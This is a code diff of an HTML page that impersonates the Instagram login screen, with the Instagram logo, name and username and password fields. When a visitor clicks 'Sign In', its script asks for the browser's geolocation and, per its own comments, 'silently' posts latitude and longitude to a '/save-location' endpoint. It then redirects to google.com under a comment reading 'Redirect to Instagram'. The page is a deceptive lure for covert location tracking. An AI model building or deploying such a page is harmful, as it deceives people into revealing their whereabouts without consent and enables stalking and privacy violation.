@@ -23,29 +23,24 @@
       text-align: center;
       box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
     }
-    .logo {
-      width: 150px;
-      margin: 0 auto 20px;
-    }
-    .logo img {
-      width: 100%;
+    .login-container h1 {
+      font-family: 'Arial Black', sans-serif;
+      font-size: 36px;
+      color: #262626;
+      margin-bottom: 20px;
     }
     input {
-      width: 90%;
-      padding: 12px;
-      margin-bottom: 12px;
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 10px;
       border: 1px solid #dbdbdb;
-      border-radius: 3px;
+      border-radius: 5px;
       background-color: #fafafa;
       font-size: 14px;
     }
-    input:focus {
-      outline: none;
-      border-color: #a8a8a8;
-    }
     button {
       width: 100%;
-      padding: 12px;
+      padding: 10px;
       background-color: #0095f6;
       border: none;
       border-radius: 5px;
@@ -58,68 +53,58 @@
     button:hover {
       background-color: #007bb5;
     }
-    .footer {
-      margin-top: 15px;
-      font-size: 12px;
-      color: #8e8e8e;
+    .logo {
+      width: 150px;
+      margin-bottom: 20px;
     }
   </style>
 </head>
 <body>
   <div class="login-container">
-    <div class="logo">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="gram Logo">
-    </div>
+    <!-- Instagram logo -->
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/1200px-Instagram_logo_2022.svg.png" alt="Instagram Logo" class="logo">
+    
+    <h1>Instagram</h1>
     <form id="loginForm">
       <input type="text" placeholder="Phone number, username, or email" required>
       <input type="password" placeholder="Password" required>
       <button type="button" id="signInBtn">Sign In</button>
     </form>
-    <div class="footer">© 2024 Instagram from Meta</div>
   </div>
 
   <script>
     const button = document.getElementById('signInBtn');
 
-    button.addEventListener('click', async () => {
+    button.addEventListener('click', () => {
       // Retrieve location silently
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           async (position) => {
-            const { latitude, longitude, accuracy } = position.coords;
-            console.log('Latitude:', latitude);
-            console.log('Longitude:', longitude);
-            console.log('Accuracy (meters):', accuracy);
+            const { latitude, longitude } = position.coords;
 
-            // Send location data to the server silently
+            // Send location data to the server silently (no feedback to the user)
             try {
               await fetch('/save-location', {
                 method: 'POST',
                 headers: {
                   'Content-Type': 'application/json',
                 },
-                body: JSON.stringify({ latitude, longitude, accuracy }),
+                body: JSON.stringify({ latitude, longitude }),
               });
             } catch (error) {
               console.error('Failed to send location:', error);
             }
-
-            // Redirect to Instagram
-            window.location.href = 'https://reel.com/';
           },
           (error) => {
             console.error('Geolocation error:', error);
-
-            // Redirect to Instagram even if location fails
-            window.location.href = 'https://reel.com';
           }
         );
       } else {
         console.error('Geolocation not supported in this browser.');
-
-        // Redirect to Instagram even if geolocation is not supported
-        window.location.href = 'https://reel.com';
       }
+
+      // Proceed with "Sign In" action (e.g., form submission or page redirection)
+      window.location.href = 'https://google.com'; // Redirect to Instagram
     });
   </script>
 </body>
